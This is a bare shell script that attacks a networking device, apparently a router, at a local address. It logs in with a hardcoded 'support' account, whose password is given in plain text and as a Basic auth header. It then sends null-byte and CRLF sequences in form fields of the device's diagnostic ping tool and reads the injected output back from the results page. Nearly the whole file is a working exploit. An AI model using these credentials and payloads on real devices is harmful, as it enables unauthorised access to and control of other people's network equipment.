#!/bin/sh
# support:theworldinyourhand
curl 'http://192.168.1.242/Forms/tools_test_1' \
  -H 'Authorization: Basic c3VwcG9ydDp0aGV3b3JsZGlueW91cmhhbmQ=' \
  --data-raw 'Test_PVC=0%0D%0A&PingIPAddr=asdf.local&pingflag=1&trace_open_flag=0&InfoDisplay=%00XInfo+-%0D%0A'
  
curl -s http://192.168.1.242/maintenance/tools_test.htm \
  -H 'Authorization: Basic c3VwcG9ydDp0aGV3b3JsZGlueW91cmhhbmQ=' \
  | tail -n +103 | head -n -9
